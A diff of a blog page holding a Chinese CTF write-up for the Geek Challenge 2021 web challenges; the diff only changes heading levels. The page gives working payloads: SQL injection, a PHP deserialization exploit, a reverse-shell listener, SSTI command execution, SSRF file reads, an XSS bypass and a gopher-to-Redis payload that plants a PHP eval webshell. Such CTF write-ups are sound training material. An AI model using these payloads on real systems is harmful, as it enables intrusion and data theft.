@@ -314,21 +314,21 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="极客大挑战2021-wp-WEB（部分）"><a href="#极客大挑战2021-wp-WEB（部分）" class="headerlink" title="极客大挑战2021_wp_WEB（部分）"></a>极客大挑战2021_wp_WEB（部分）</h1><h1 id="Dark"><a href="#Dark" class="headerlink" title="Dark"></a>Dark</h1><p><img src="image-20211025113848135.png" alt="image-20211025113848135"></p>
+                <h2 id="极客大挑战2021-wp-WEB（部分）"><a href="#极客大挑战2021-wp-WEB（部分）" class="headerlink" title="极客大挑战2021_wp_WEB（部分）"></a>极客大挑战2021_wp_WEB（部分）</h2><h2 id="Dark"><a href="#Dark" class="headerlink" title="Dark"></a>Dark</h2><p><img src="image-20211025113848135.png" alt="image-20211025113848135"></p>
 <p>网址以.onion为后缀，这是洋葱浏览器的网址后缀，下载洋葱浏览器访问即可拿到flag</p>
 <p><img src="image-20211025114113682.png" alt="image-20211025114113682"></p>
-<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{hav3_fUn_1n_darK}
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{hav3_fUn_1n_darK}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Welcome2021"><a href="#Welcome2021" class="headerlink" title="Welcome2021"></a>Welcome2021</h1><p><img src="image-20211025114200101.png" alt="image-20211025114200101"></p>
+<h2 id="Welcome2021"><a href="#Welcome2021" class="headerlink" title="Welcome2021"></a>Welcome2021</h2><p><img src="image-20211025114200101.png" alt="image-20211025114200101"></p>
 <p>查看源码</p>
 <p><img src="image-20211025114217472.png" alt="image-20211025114217472"></p>
 <p>Burp改请求为WELCOME</p>
 <p><img src="image-20211025114418704.png" alt="image-20211025114418704"></p>
 <p>访问f1111aaaggg9.php</p>
 <p><img src="image-20211025114515505.png" alt="image-20211025114515505"></p>
-<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{WeLcom3_t0_Geek_2o21!!}
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{WeLcom3_t0_Geek_2o21!!}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h1><p><img src="image-20211025114612659.png" alt="image-20211025114612659"></p>
+<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p><img src="image-20211025114612659.png" alt="image-20211025114612659"></p>
 <p>随便输点东西测试</p>
 <p><img src="image-20211025114819482.png" alt="image-20211025114819482"></p>
 <p>uname存在注入点</p>
@@ -342,14 +342,14 @@
 <p>查列</p>
 <p><img src="image-20211025115512066.png" alt="image-20211025115512066"></p>
 <p>查字段</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-payload"><code class="language-payload">pwd=admin#&uname=admn' union select 1,(select group_concat(fllllllag,wlz) from flag.fllag),3,4#
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">pwd=admin#&uname=admn' union select 1,(select group_concat(fllllllag,wlz) from flag.fllag),3,4#
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_Sql_Noyv~}
+<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_Sql_Noyv~}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h1><p>反序列化pop链</p>
+<h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><p>反序列化pop链</p>
 <p><img src="image-20211025121610226.png" alt="image-20211025121610226"></p>
 <p>入口在class e而关键点在class c ，所以需要先调用c在调用e</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">{</span>
     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
@@ -388,9 +388,9 @@
 <span class="token comment" spellcheck="true">//nc -lvp 2333 即可拿到flag</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="image-20211025122022249.png" alt="image-20211025122022249"></p>
-<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_n3ed_JiaRan&PHP_m@gic_meth0ds}
+<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_n3ed_JiaRan&PHP_m@gic_meth0ds}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h1><p><img src="image-20211025122124919.png" alt="image-20211025122124919"></p>
+<h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><p><img src="image-20211025122124919.png" alt="image-20211025122124919"></p>
 <p>简单的反弹shell</p>
 <p>传入自己的服务器ip和端口</p>
 <p><img src="image-20211025122347326.png" alt="image-20211025122347326"></p>
@@ -406,35 +406,35 @@
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="image-20211025134007810.png" alt="image-20211025134007810"></p>
 <p><img src="image-20211025134632890.png" alt="image-20211025134632890"></p>
-<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{Baka~Baka~Baka~}
+<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{Baka~Baka~Baka~}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>查看源码</p>
+<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>查看源码</p>
 <p><img src="image-20211026200549555.png" alt="image-20211026200549555"></p>
 <p>访问robots.txt</p>
 <p><img src="image-20211026200624314-16352499870331.png" alt="image-20211026200624314"></p>
 <p><img src="image-20211026200650748.png" alt="image-20211026200650748"></p>
 <p>SSRF,直接file://协议度文件</p>
-<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-payload"><code class="language-payload">http://47.100.242.70:4659/noobcurl.php?url=file:///flag
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">http://47.100.242.70:4659/noobcurl.php?url=file:///flag
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_Ss4f_3ovv~}
+<h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_Ss4f_3ovv~}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h1><p><img src="image-20211026200931468.png" alt="image-20211026200931468"></p>
+<h2 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h2><p><img src="image-20211026200931468.png" alt="image-20211026200931468"></p>
 <p>ssti，原理不解释</p>
-<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-payload"><code class="language-payload">body=<body>{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /flag').read()}}</body>&title=111
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-payload"><code class="language-payload">body=<body>{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /flag').read()}}</body>&title=111
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20211026201052220.png" alt="image-20211026201052220"></p>
-<h2 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{The_SsTi_1s_V3ry_funNy!}
+<h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{The_SsTi_1s_V3ry_funNy!}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="蜜雪冰城甜蜜蜜"><a href="#蜜雪冰城甜蜜蜜" class="headerlink" title="蜜雪冰城甜蜜蜜"></a>蜜雪冰城甜蜜蜜</h1><p><img src="image-20211026201154844.png" alt="image-20211026201154844"></p>
+<h2 id="蜜雪冰城甜蜜蜜"><a href="#蜜雪冰城甜蜜蜜" class="headerlink" title="蜜雪冰城甜蜜蜜"></a>蜜雪冰城甜蜜蜜</h2><p><img src="image-20211026201154844.png" alt="image-20211026201154844"></p>
 <p>看看源码</p>
 <p><img src="image-20211026201242254.png" alt="image-20211026201242254"></p>
 <p>获取点击的id值，处理后上传</p>
 <p>本来想着伪造params.sign，不过后面看着看着被自己气到了</p>
 <p>直接改一个的html为id=9</p>
 <p><img src="image-20211026201547919.png" alt="image-20211026201547919"></p>
-<h2 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{N1_A1_W0_Ya_W0_L0vE_Ni!}
+<h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{N1_A1_W0_Ya_W0_L0vE_Ni!}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="雷克雅未克"><a href="#雷克雅未克" class="headerlink" title="雷克雅未克"></a>雷克雅未克</h1><p><img src="image-20211026201641470.png" alt="image-20211026201641470"></p>
+<h2 id="雷克雅未克"><a href="#雷克雅未克" class="headerlink" title="雷克雅未克"></a>雷克雅未克</h2><p><img src="image-20211026201641470.png" alt="image-20211026201641470"></p>
 <p>直接了当，需要伪造ip和经纬度</p>
 <p>抓包</p>
 <p><img src="image-20211026201755112.png" alt="image-20211026201755112"></p>
@@ -449,18 +449,18 @@
 <pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fackjson所以字符<span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20211026202828140.png" alt="image-20211026202828140"></p>
-<h2 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{Welc0me_Rey_k_jav1_k}
+<h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{Welc0me_Rey_k_jav1_k}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h1><p><img src="image-20211026203029752.png" alt="image-20211026203029752"></p>
+<h2 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h2><p><img src="image-20211026203029752.png" alt="image-20211026203029752"></p>
 <p>xss注入，思路同sql注入</p>
 <p>这种也就两步：闭合、绕过</p>
-<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token string">");alalertert(1)("</span>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token string">");alalertert(1)("</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>闭合console.log, 双写alert绕过</p>
 <p><img src="image-20211026203342637.png" alt="image-20211026203342637"></p>
-<h2 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">Syc{W4lc0me_t0_the_w0rld_0f_x3s.}
+<h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">Syc{W4lc0me_t0_the_w0rld_0f_x3s.}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h1><p>让人讨厌的套娃</p>
+<h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>让人讨厌的套娃</p>
 <p><img src="image-20211026203548487.png" alt="image-20211026203548487"></p>
 <p>password不能是数字，且大于9999</p>
 <p>%00绕过</p>
@@ -491,18 +491,18 @@
 <p>服务端接收GET时会进行一次url解码，这里又一次，所以直接url编码两次传上去</p>
 <p>harback不会url编码字母，所以用burp</p>
 <p><img src="image-20211026205356787.png" alt="image-20211026205356787"></p>
-<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-payload"><code class="language-payload">/here_s_the_flag.php?id=%25%34%63%25%36%66%25%36%65%25%36%37%25%36%63%25%36%66%25%36%65%25%36%35
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">/here_s_the_flag.php?id=%25%34%63%25%36%66%25%36%65%25%36%37%25%36%63%25%36%66%25%36%65%25%36%35
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20211026205406921.png" alt="image-20211026205406921"></p>
-<h2 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">flag{PHP_1s_fu1king_awesome}
+<h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{PHP_1s_fu1king_awesome}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="givemeyourlove"><a href="#givemeyourlove" class="headerlink" title="givemeyourlove"></a>givemeyourlove</h1><p><img src="image-20211026205528755.png" alt="image-20211026205528755"></p>
+<h2 id="givemeyourlove"><a href="#givemeyourlove" class="headerlink" title="givemeyourlove"></a>givemeyourlove</h2><p><img src="image-20211026205528755.png" alt="image-20211026205528755"></p>
 <p>SSRF攻击redis，带密码</p>
 <p>攻击原理我在SSRF一文中已经写过，这里直接打</p>
 <p>文章地址<code>https://atmujie.github.io/2021/09/22/SSRF/</code></p>
 <p>虽然写的比较水，但不想再这里再说一次了</p>
 <p>这里我手搓个payload出来</p>
-<h2 id="伪造数据包"><a href="#伪造数据包" class="headerlink" title="伪造数据包"></a>伪造数据包</h2><pre class="line-numbers language-bash"><code class="language-bash">socat -v tcp-listen:2333,fork tcp:localhost:6379
+<h3 id="伪造数据包"><a href="#伪造数据包" class="headerlink" title="伪造数据包"></a>伪造数据包</h3><pre class="line-numbers language-bash"><code class="language-bash">socat -v tcp-listen:2333,fork tcp:localhost:6379
 监听2333，转发6379
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="image-20211026210313942.png" alt="image-20211026210313942"></p>
@@ -617,16 +617,16 @@ quit\r
 <p>这里最好检查一下payload，尤其是?和\r，要确保已经url编码过一次</p>
 <p>再次url编码传入，回显全为+OK即为成功</p>
 <p><img src="image-20211026213645354.png" alt="image-20211026213645354"></p>
-<h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-payload"><code class="language-payload">?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2413%250d%250a%2Fvar%2Fwww%2Fhtml%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%249%250d%250aredis.php%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*3%250d%250a%243%250d%250aset%250d%250a%248%250d%250awebshell%250d%250a%2424%250d%250a%3C%253Fphp%20eval(%24_POST%5B0%5D)%3B%253F%3E%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2413%250d%250a%2Fvar%2Fwww%2Fhtml%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%249%250d%250aredis.php%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*3%250d%250a%243%250d%250aset%250d%250a%248%250d%250awebshell%250d%250a%2424%250d%250a%3C%253Fphp%20eval(%24_POST%5B0%5D)%3B%253F%3E%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>访问shell，查看flag</p>
 <p><img src="image-20211026214655340.png" alt="image-20211026214655340"></p>
-<h2 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{ygtq_w@nt_a_glrlfr1ed}
+<h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{ygtq_w@nt_a_glrlfr1ed}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h1><p>这道题难点就在对原型类的使用，参考这篇文章</p>
+<h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><p>这道题难点就在对原型类的使用，参考这篇文章</p>
 <p><code>https://whoamianony.top/2021/03/10/Web%E5%AE%89%E5%85%A8/PHP%20%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93/</code></p>
 <p><img src="image-20211026215015504.png" alt="image-20211026215015504"></p>
-<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name">fxxk</span>
 <span class="token punctuation">{</span>
     <span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>
@@ -723,10 +723,10 @@ quit\r
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{Unser1al1z3_is_so_fxxk}
+<h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{Unser1al1z3_is_so_fxxk}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这道题还是很有水平的</p>
-<h1 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h1><p>报错注入</p>
+<h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p>报错注入</p>
 <p>过滤了最常用的updatexml和extractvalue,但其他偏门的没有过滤</p>
 <p>所以直接百度一条payload</p>
 <pre class="line-numbers language-payload"><code class="language-payload">id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)
@@ -747,11 +747,11 @@ quit\r
 <pre class="line-numbers language-payload"><code class="language-payload">pwd=1&uname=Atmujie' or (select 1 from  (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database()),floor(rand(0)*2))x from  information_schema.tables group by x)a)#
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20211104144940980.png" alt="image-20211104144940980"></p>
-<h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h2><p>查flag</p>
+<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>查flag</p>
 <pre class="line-numbers language-payload"><code class="language-payload">pwd=1&uname=Atmujie' or (select 1 from  (select count(*),concat((select flag from true____flag.syclover limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a)#
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20211104145817480.png" alt="image-20211104145817480"></p>
-<h2 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_3rR0r_Inj3c410n}
+<h3 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_3rR0r_Inj3c410n}
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
             </div>
